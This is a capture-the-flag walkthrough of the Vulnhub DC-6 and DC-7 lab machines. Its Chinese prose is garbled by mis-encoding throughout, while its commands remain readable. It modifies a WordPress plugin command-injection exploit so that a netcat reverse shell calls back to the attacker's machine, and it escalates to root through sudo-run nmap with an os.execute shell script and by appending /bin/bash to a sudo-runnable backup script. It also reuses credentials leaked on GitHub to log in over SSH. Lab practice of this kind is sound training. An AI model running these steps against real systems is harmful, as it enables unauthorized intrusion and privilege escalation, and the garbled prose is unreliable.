class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼šæŠ¥é”™</p><p>ä¼¼ä¹ä¸èƒ½ä½¿ç”¨<code>python</code>å‘½ä»¤ï¼Œä¸€ä½¿ç”¨å°±é€€å‡º<code>shell</code></p><p><img src="/2022/08/29/vulnhub/image-20221010233037169.png" alt="image-20221010233037169"></p><p>é‚£å°±çœ‹èµ·æ¥æœ‰ç‚¹éš¾å—äº†ï¼Œå†è¯•è¯•èƒ½ä¸èƒ½è¿›å…¥ç¨³å®š<code>shell</code></p><blockquote><p>å…ˆ<br><code>ctrl+z</code><br>ç„¶åæ‰§è¡Œ<br><code>stty raw -echo ; fg ; reset</code>  </p></blockquote><p>ç»“æœå¡æ­»äº†</p><p>ç®—äº†ç®—äº†ï¼Œå°±è¿™æ ·çœ‹å§</p><p>ã€æˆ‘è¿™é‡ŒæŠŠ<code>py</code>è„šæœ¬å¯¼å…¥ä¸€ä¸ªæ–°çš„æ–‡ä»¶é‡Œï¼ˆ<code>1.py</code>ï¼‰ï¼ŒæŠŠæˆ‘çš„ipï¼Œç”¨æˆ·åï¼Œå¯†ç éƒ½å†™äº†è¿›å»ï¼Œå°±ä¸ç”¨é€€å‡ºäº†åˆé‡æ–°è¾“å…¥äº†ã€‘</p><hr><p>å…ˆé€€åˆ°ä¸»ç›®å½•çœ‹çœ‹æœ‰å‡ ä¸ªç”¨æˆ·</p><p>ä½†æ˜¯å‘ç°å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä¼¼ä¹æœ‰çš„å‘½ä»¤æ‰§è¡Œå°±å’Œè„šæœ¬å†²çªï¼Œé‚£å°±ç”¨</p><p><img src="/2022/08/29/vulnhub/image-20221010234544191.png" alt="image-20221010234544191"></p><h3 id="2ï¼‰45274-html"><a href="#2ï¼‰45274-html" class="headerlink" title="2ï¼‰45274.html"></a>2ï¼‰45274.html</h3><p>é‚£æˆ‘ä»¬å…ˆä¸ç®¡å®ƒï¼Œæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªå‘½ä»¤æ³¨å…¥çš„æ²¡æœ‰ç”¨ï¼Œ</p><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">45274</span>.html</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221011113959660.png" alt="image-20221011113959660"></p><p>æˆ‘ä»¬æŠŠè¿™ä¸ªæ–‡ä»¶å¯¼å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ä¸­ã€1.htmlã€‘</p><p>ä¸»è¦æ˜¯ä¿®æ”¹è¿™é‡Œçš„ç½‘ç«™ç½‘å€å’Œç›‘å¬æœ¬åœ°<code>ip</code>ï¼Œæ”¹æˆæˆ‘ä»¬çš„<code>wordy</code>å’Œ<code>kali</code>æœºçš„<code>ip</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost:<span class="number">8000</span><span class="regexp">/wp-admin/</span>admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span>admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221011115438911.png" alt="image-20221011115438911"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp <span class="number">127.0</span>.<span class="number">0.1</span>   <span class="operator">=</span><span class="operator">=</span>&gt;   nc <span class="number">192.168</span>.<span class="number">133.140</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221011114105820.png" alt="image-20221011114105820"></p><p>ç„¶åå› ä¸ºæ˜¯<code>html</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œ</p><p><img src="/2022/08/29/vulnhub/image-20221011114637014.png" alt="image-20221011114637014"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -m http.server <span class="number">8008</span></span><br></pre></td></tr></table></figure><p>ç„¶åä»¥æµè§ˆå™¨æ–¹å¼è®¿é—®æœ¬åœ°<code>ip:8008</code>ï¼Œå†æ‰“å¼€é‡Œé¢<code>1.html</code>æ–‡ä»¶</p><p><img src="/2022/08/29/vulnhub/image-20221011114825111.png" alt="image-20221011114825111"></p><h4 id="ncç›‘å¬æ‹¿shell"><a href="#ncç›‘å¬æ‹¿shell" class="headerlink" title="ncç›‘å¬æ‹¿shell"></a>ncç›‘å¬æ‹¿shell</h4><p>ç„¶åæˆ‘ä»¬å‘ç°æœ‰ä¸ª</p><p><code>Submit request</code>çš„æŒ‰é’®ï¼Œçœ‹æ¥æ˜¯å‘é€è¯·æ±‚ï¼Œç„¶å<code>nc</code>åå¼¹shell</p><blockquote><p>æ³¨æ„ç›‘å¬ç«¯å£æ˜¯<code>9999</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221011115108761.png" alt="image-20221011115108761"></p><p>ç„¶åæˆ‘ä»¬åœ¨æµè§ˆå™¨ç‚¹å‡»ä¸€ä¸‹<code>Submit request</code></p><p><img src="/2022/08/29/vulnhub/image-20221011122029894.png" alt="image-20221011122029894"></p><p>è¿æ¥åˆ° <code>shell</code></p><p>è¿™ä¸ªæ¯”è„šæœ¬çš„é‚£ä¸ªå°±æ›´åŠ æ–¹ä¾¿ä¸€ä¸‹äº†ï¼Œ</p><hr><p>å›ºå®šå§¿åŠ¿</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥ç¨³å®šå¼shell</p><blockquote><p>å…ˆ<code>ctrl+z</code><br>ç„¶åæ‰§è¡Œ<br><code>stty raw -echo ; fg ; reset</code> Â </p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221011122301709.png" alt="image-20221011122301709"></p><hr><p>ç„¶åå¼€å§‹æ‰¾æ‰¾æœ‰æ²¡æœ‰å…¶ä»–ç”¨æˆ·çš„å¯†ç ä¿¡æ¯</p><p>å…ˆåˆ° <code>/home</code> é‡ŒæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°äº†é™¤äº†<code>admin</code>å…¶ä»–ä¸‰ä¸ªç”¨æˆ·ç›®å½•</p><p><img src="/2022/08/29/vulnhub/image-20221011122438174.png" alt="image-20221011122438174"></p><p>æˆ‘ä»¬å…ˆè¿›æˆ‘ä»¬ç™»å½•æˆåŠŸçš„<code>mark</code>ç›®å½•æŸ¥çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20221011122638708.png" alt="image-20221011122638708"></p><p>å‘ç°æœ‰ä¸ª<code>things-to-do.txt</code>æ–‡æœ¬æ–‡ä»¶</p><p>æŸ¥çœ‹å†…å®¹</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> things-<span class="keyword">to</span>-<span class="keyword">do</span>.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221011122741660.png" alt="image-20221011122741660"></p><blockquote><p><code>Things to do:</code></p><ul><li><code>Restore full functionality for the hyperdrive (need to speak to Jens)</code></li><li><code>Buy present for Sarah&#39;s farewell party</code></li><li><code>Add new user: graham - GSo7isUM1D4 - done</code></li><li><code>Apply for the OSCP course</code></li><li><code>Buy new laptop for Sarah&#39;s replacement</code></li></ul><p>æ„æ€æ˜¯ï¼š</p><p>è¦åšçš„äº‹æƒ…ï¼š</p><ul><li>æ¢å¤è¶…å…‰é€Ÿå¼•æ“çš„å…¨éƒ¨åŠŸèƒ½ï¼ˆéœ€è¦ä¸ Jens äº¤è°ˆï¼‰</li><li>ä¸ºèæ‹‰çš„å‘Šåˆ«æ´¾å¯¹è´­ä¹°ç¤¼ç‰©</li><li>æ·»åŠ æ–°ç”¨æˆ·ï¼šgraham - GSo7isUM1D4 - å®Œæˆ</li><li>ç”³è¯·OSCPè¯¾ç¨‹</li><li>ä¸ºèæ‹‰è´­ä¹°æ–°çš„ç¬”è®°æœ¬ç”µè„‘</li></ul><p>&#x2F;&#x2F;å…³é”®ä¿¡æ¯æˆ‘ä»¬å¾—åˆ°äº†grahamç”¨æˆ·çš„å¯†ç ã€æˆ‘ä¹Ÿæƒ³è€ƒOSCPï¼Œå“­å”§å”§ã€‘</p></blockquote><p>æˆ‘ä»¬æ ¹æ®æˆ‘ä»¬æ‹¿åˆ°<code>graham</code>çš„ä¿¡æ¯ï¼Œç™»å½•<code>ssh</code></p><p>ã€å½“ç„¶åœ¨åŸæœ‰<code>shell</code>é‡Œåˆ©ç”¨<code>su</code>å‘½ä»¤åˆ‡æ¢ç”¨æˆ·<code>graham</code>ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯<code>ssh</code>æœ‰é¢œè‰²ï¼Œçœ‹èµ·æ¥å¥½çœ‹ä¸€äº›ã€‘</p><p>ã€å› ä¸ºä¹‹å‰å°±çœ‹åˆ°è¿è¡Œç€<code>ssh</code>ï¼Œæ²¡å¿…è¦å†åœ¨ç™»å½•ä¸€æ¬¡ç½‘ç«™ï¼Œåæ­£ä¸æ˜¯æœ€é«˜æƒé™ã€‘</p><blockquote><p><code>ssh graham@192.168.133.145 -p 22</code>    &#x2F;&#x2F;é¶æœºip  sshè¿è¡Œç«¯å£<br>å¯†ç ï¼š<code>GSo7isUM1D4</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221011123625279.png" alt="image-20221011123625279"></p><p>ç„¶åæˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬æœ‰å“ªäº›å‘½ä»¤å¯ä»¥æ‰§è¡Œ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221011124153885.png" alt="image-20221011124153885"></p><p>çœ‹åˆ°æ˜¯æœ‰<code>jens</code>ç›®å½•ä¸‹ä¸€ä¸ªè„šæœ¬æ–‡ä»¶çš„è¿è¡Œæƒé™ï¼Œè€Œä¸”ä¸éœ€è¦<code>jens</code>çš„å¯†ç ï¼Œå°±å¯ä»¥ä»–çš„èº«ä»½ä¸‹è¿è¡Œäº†ã€<code>mark</code>æˆ‘è¯•äº†çš„ï¼Œæ²¡æœ‰æƒé™ã€‘</p><h4 id="ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·"><a href="#ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·" class="headerlink" title="ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·"></a>ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·</h4><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/home/</span>jens/backups.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221011124824445.png" alt="image-20221011124824445"></p><p>å‘ç°æ˜¯æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œ</p><p>ä½†æ˜¯æˆ‘ä»¬çš„ç›®çš„æƒ³è·å¾—<code>jens</code>çš„ç™»å½•æƒé™ï¼Œæˆ‘ä»¬åœ¨è„šæœ¬æ–‡ä»¶ä¸­è¿½åŠ ä¸€äº›å‘½ä»¤</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;/bin/bash&quot;</span>  &gt;&gt; <span class="regexp">/home/</span>jens/backups.sh</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯å½“æˆ‘ä»¬ä»¥<code>jens</code>èº«ä»½è¿è¡Œè¿™ä¸ªè„šæœ¬æ—¶ï¼Œå½“æ‰§è¡Œ<code>/bin/bash</code>æ—¶ï¼Œå°±ç®—æˆ‘ä»¬ç°åœ¨æ˜¯<code>graham</code>ï¼Œä¹Ÿä¼šåˆ‡æ¢æˆ<code>jens</code>ï¼Œè¿™ä¹Ÿå¾—ç›Šäºå¯ä»¥<code>nopasswd</code>è¿è¡Œ</p><blockquote><p><code>sudo -u jens /home/jens/backups.sh</code></p><p>&#x2F;&#x2F;æ³¨æ„å“¦ï¼Œè¿™é‡Œæ˜¯éœ€è¦ä»¥<code>jens</code>èº«ä»½è¿è¡Œã€æ¯•ç«Ÿä»–ç»™äº†æˆ‘ä»¬ç”¨ä»–èº«ä»½æ‰§è¡Œæƒé™ã€‘æ‰å¯ä»¥å®ç°åˆ‡æ¢ç”¨æˆ·ï¼Œå¦‚æœç›´æ¥è¿è¡Œè¿˜æ˜¯<code>graham</code>ç”¨æˆ·ï¼Œå°±å¦‚ä¸‹å›¾ä¸€æ ·</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221011125910796.png" alt="image-20221011125910796"></p><p>åˆ‡æ¢ç”¨æˆ·æˆåŠŸï¼Œ</p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>jens</code>æœ‰å“ªäº›å‘½ä»¤å¯ä»¥æ‰§è¡Œ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221011130314044.png" alt="image-20221011130314044"></p><p>ç»ˆäºï¼Œå‘ç°äº†<code>root</code>çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ<code>nmap</code>å‘½ä»¤ã€åªæœ‰ç®¡ç†å‘˜å¯ä»¥ã€‘ï¼Œé‚£ä¹ˆå¦‚ä½•æ‹¿åˆ°æƒé™å‘¢</p><h2 id="4-nmapææƒ"><a href="#4-nmapææƒ" class="headerlink" title="4.nmapææƒ"></a>4.nmapææƒ</h2><h3 id="1-æ—§ç‰ˆ"><a href="#1-æ—§ç‰ˆ" class="headerlink" title="1.æ—§ç‰ˆ"></a>1.æ—§ç‰ˆ</h3><p>nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œ:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure><p>msfä¸­çš„æ¨¡å—ä¸ºï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit<span class="regexp">/unix/</span>local/setuid_nmap</span><br></pre></td></tr></table></figure><h3 id="2-æ–°ç‰ˆ"><a href="#2-æ–°ç‰ˆ" class="headerlink" title="2.æ–°ç‰ˆ"></a>2.æ–°ç‰ˆ</h3><p>è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ <code>--script</code> å‚æ•°ï¼š</p><blockquote><p>å…ˆå†™å…¥ä¸€æ¡å‘½ä»¤<br><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; getshell</code><br>å†â€“scriptå‚æ•°ï¼Œæ‰§è¡Œ<br><code>sudo nmap --script=getshell</code></p></blockquote><p>æŸ¥çœ‹ä¸€ä¸‹é¶æœºçš„<code>nmap</code>ç‰ˆæœ¬</p><p><code>7.4</code>è¿˜æ˜¯æŒºé«˜çš„</p><p><img src="/2022/08/29/vulnhub/image-20221011131514173.png" alt="image-20221011131514173"></p><p>é‚£æˆ‘ä»¬å†™ä¸€ä¸ªè„šæœ¬ï¼Œé‡Œé¢åŠ ä¸Šå‘½ä»¤ï¼Œå†ç”¨æ–°ç‰ˆ<code>nmap</code>è¿è¡Œè¿™ä¸ªè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„å“ˆï¼Œ<code>jens</code>åªæœ‰åœ¨<code>~</code>ç›®å½•ä¸‹æ‰å¯ä»¥æ‰§è¡Œ<code>echo</code>å‘½ä»¤ï¼Œä¸ç„¶æ˜¯ä¸å¯ä»¥çš„</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221011132114963.png" alt="image-20221011132114963"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap <span class="attribute">--script</span>=getshell</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221011132315607.png" alt="image-20221011132315607"></p><p>æˆåŠŸææƒï¼Œç„¶åæˆ‘ä»¬æŸ¥æ‰¾<code>flag</code>ã€æ²¡è¾“å…¥å›æ˜¾æœ‰ç‚¹å°éš¾å—ï¼Œä½†æ˜¯ä¸å½±å“æ‹¿<code>flag</code>ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20221011132507052.png" alt="image-20221011132507052"></p><blockquote><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Yb        dP<span class="number"> 888888 </span>88    <span class="number"> 88 </span>        8888b.   dP&quot;Yb  88b<span class="number"> 88 </span>888888 d8b </span><br><span class="line"> Yb  db  dP  88__  <span class="number"> 88 </span>   <span class="number"> 88 </span>         8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;  <span class="number"> 88 </span> .o<span class="number"> 88 </span> .o      8I  dY Yb   dP<span class="number"> 88 </span>Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP   <span class="number"> 888888 </span>88ood8 88ood8     8888Y&quot;   YbodP <span class="number"> 88 </span> Y8<span class="number"> 888888 </span>(8) </span><br></pre></td></tr></table></figure><p><code>Congratulations!!!</code></p><p><code>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p><p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p><p>æ„æ€æ˜¯ï¼š<br>æ­å–œï¼ï¼ï¼</p><p>å¸Œæœ›ä½ å–œæ¬¢ DC-6ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>è°æä¾›äº†åé¦ˆï¼Œè°èŠ±æ—¶é—´å®Œæˆäº†è¿™äº›å°äº‹<br>æŒ‘æˆ˜ã€‚</p><p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p></blockquote><p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p><hr><h1 id="ä¸ƒã€DC-7-ä¸­çº§"><a href="#ä¸ƒã€DC-7-ä¸­çº§" class="headerlink" title="ä¸ƒã€DC-7[ä¸­çº§]"></a>ä¸ƒã€DC-7[ä¸­çº§]</h1><p><strong>only one flag</strong></p><blockquote><p><code>hintï¼š</code><br><code>While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.</code></p><p><code>What you will need to do, is to think &quot;outside&quot; of the box.</code></p><p><code>Waaaaaay &quot;outside&quot; of the box. :-)</code></p><p>è™½ç„¶è¿™æ˜¯è¾ƒæ—©çš„ DC ç‰ˆæœ¬çš„ä¸€ç§åˆä¹é€»è¾‘çš„è¿›å±•ï¼ˆæˆ‘ä¸ä¼šå‘Šè¯‰ä½ æ˜¯å“ªä¸€ä¸ªï¼‰ï¼Œä½†å…¶ä¸­æ¶‰åŠåˆ°ä¸€äº›æ–°æ¦‚å¿µï¼Œä½†ä½ éœ€è¦è‡ªå·±å¼„æ¸…æ¥šè¿™äº›ã€‚:-) å¦‚æœæ‚¨éœ€è¦ä½¿ç”¨æš´åŠ›ç ´è§£æˆ–å­—å…¸æ”»å‡»ï¼Œæ‚¨å¯èƒ½ä¸ä¼šæˆåŠŸã€‚</p><p>æ‚¨éœ€è¦åšçš„æ˜¯è·³å‡ºæ¡†æ¡†æ€è€ƒã€‚</p><p>Waaaaaayâ€œåœ¨ç›’å­å¤–é¢â€ã€‚:-)</p></blockquote><h2 id="ä¿¡æ¯æ”¶é›†-6"><a href="#ä¿¡æ¯æ”¶é›†-6" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><code>nmap</code>æ‰«ææŸ¥çœ‹å¼€æ”¾ç«¯å£</p><p><img src="/2022/08/29/vulnhub/image-20221018195918528.png" alt="image-20221018195918528"></p><p>å‘ç°è¿è¡Œç€<code>22</code>å’Œ<code>80</code>ç«¯å£ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code></p><p>å…ˆçœ‹çœ‹æ¡†æ¶å’Œè¯­è¨€</p><p><img src="/2022/08/29/vulnhub/image-20221018194429569.png" alt="image-20221018194429569"></p><p><code>CMS</code>æ˜¯<code>Drupal 8</code>ï¼Œçœ‹æ¥è¿™æ˜¯å…³é”®ã€å¥½å®¶ä¼™ï¼Œ<code>DC1</code>é‡ç°ã€‘</p><p>å†é¡ºæ‰‹æ‰«ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221018194353195.png" alt="image-20221018194353195"></p><p>çœ‹åˆ°æœ‰ä¸€ä¸ªç™»å½•çª—å£é¡µé¢</p><p><img src="/2022/08/29/vulnhub/image-20221018194531613.png" alt="image-20221018194531613"></p><p>é‚£æˆ‘ä»¬å°±å…ˆæƒ³åŠæ³•æ€ä¹ˆè·å¾—ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç </p><hr><h2 id="1-è·³å‡ºæ¡†æ¶"><a href="#1-è·³å‡ºæ¡†æ¶" class="headerlink" title="1.è·³å‡ºæ¡†æ¶"></a>1.è·³å‡ºæ¡†æ¶</h2><blockquote><p>è¿™é‡Œæˆ‘å¼€å§‹ä»¥ä¸ºæ˜¯æ€ç»´çš„æ¡†æ¶ï¼Œç»“æœæ˜¯é¶æœºçš„æ¡†æ¶ï¼Œæˆ‘ä»¬éœ€è¦ç”¨æœç´ å·¥å…·ï¼Œå¾—åˆ°æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œè€Œä¸æ˜¯æ­»è„‘ç­‹åœ¨é¶æœºä¸Šè‹¦è‹¦æ‰¾æ¼æ´æˆ–è€…è›®ç”¨çˆ†ç ´</p><p>åœ¨å®é™…çš„ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œåœ¨ç½‘ç«™ä¹‹å¤–è·å¾—ç½‘ç«™çš„ä¿¡æ¯ï¼Œè¿™ä¹Ÿæ˜¯æ”¶é›†ä¿¡æ¯çš„ä¸€ä¸ªé‡è¦çš„åŠæ³•</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221018200526154.png" alt="image-20221018200526154"></p><p>åœ¨ç½‘ç«™çš„æœ€åº•ä¸‹æˆ‘ä»¬å‘ç°äº†</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DC</span>7USER</span><br></pre></td></tr></table></figure><p>è¿™åº”è¯¥æ˜¯ç½‘ç«™çš„æ­å»ºè€…ï¼Œå¯¹äºåƒè¿™ç§å°ç½‘ç«™ï¼Œä¸€èˆ¬å¯èƒ½æ˜¯åœ¨ä¸€äº›å¹³å°ï¼Œæ¯”å¦‚<code>github</code>ä¸Šæ­å»ºã€æŒ‚è½½çš„ã€æ¯”å¦‚æˆ‘çš„åšå®¢ã€‘ï¼Œæ‰€ä»¥åœ¨è¿™äº›å¹³å°ä¸Šï¼Œæˆ‘ä»¬å¾ˆæœ‰å¯èƒ½å¾—åˆ°ä¸€äº›æˆ‘ä»¬æƒ³è¦çš„æ•æ„Ÿä¿¡æ¯å’Œæ–‡ä»¶</p><p>æ‰€ä»¥æˆ‘ä»¬ç”¨<code>bing</code>æŸ¥ä¸€ä¸‹ã€å›½å†…æœç´¢å¼•æ“å¾ˆéš¾æœåˆ°ï¼Œè°·æ­Œè¦é­”æ³•ï¼Œæˆ‘å†™è¿™<code>DC7</code>è¿™å‡ å¤©ä¸æ–¹ä¾¿é­”æ³•ï¼Œæ‰€ä»¥<code>bing</code>æœ€å¥½ã€‘</p><p>è¿˜çœŸæ‰¾åˆ°äº†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Dc7User/</span>staffdb<span class="regexp">/blob/m</span>aster/config.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221018201258802.png" alt="image-20221018201258802"></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string"> &lt;?php </span>|<span class="string">                                                              </span>|</span><br><span class="line">|<span class="string"> ----- </span>|<span class="string"> ------------------------------------------------------------ </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $servername = &quot;localhost&quot;;                                   </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $username = &quot;dc7user&quot;;                                       </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $password = &quot;MdR3xOgB7#dW&quot;;                                  </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $dbname = &quot;Staff&quot;;                                           </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $conn = mysqli_connect($servername, $username, $password, $dbname); </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> ?&gt;                                                           </span>|</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è´¦å·å’Œå¯†ç ï¼Œä»¥åŠæ•°æ®åº“çš„åå­—ï¼Œçœ‹æ¥æˆ‘ä»¬ç¡®å®è·³å‡ºäº†æ¡†æ¶</p><p>æˆ‘ä»¬åˆ©ç”¨è´¦å·å¯†ç åœ¨æˆ‘ä»¬ä¹‹å‰çš„ç½‘ç«™ç™»å½•ä¸€ä¸‹è¯•è¯•</p><blockquote><p>$username &#x3D; â€œ<code>dc7user</code>â€œ;<br>$password &#x3D; â€œ<code>MdR3xOgB7#dW</code>â€œ;  </p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221018201801467.png" alt="image-20221018201801467"></p><p>ç»“æœæŠ¥é”™ï¼Œçœ‹æ¥è¿™ä¸ªè´¦å·å¹¶ä¸æ˜¯åœ¨è¿™ä¸ªé¡µé¢ç™»å½•çš„</p><h2 id="2-sshç™»å½•"><a href="#2-sshç™»å½•" class="headerlink" title="2.sshç™»å½•"></a>2.sshç™»å½•</h2><p>æˆ‘ä»¬æ ¹æ®ä¹‹å‰å¾—åˆ°çš„ä¿¡æ¯çŸ¥é“ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code>ï¼Œæˆ‘ä»¬ç”¨å…¶ç™»å½•è¯•è¯•</p><blockquote><p>$username &#x3D; â€œ<code>dc7user</code>â€œ;<br>$password &#x3D; â€œ<code>MdR3xOgB7#dW</code>â€œ;  </p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221018202130724.png" alt="image-20221018202130724"></p><p>å¥½å®¶ä¼™ï¼Œæœç„¶æ˜¯<code>ssh</code>çš„è´¦å·å¯†ç 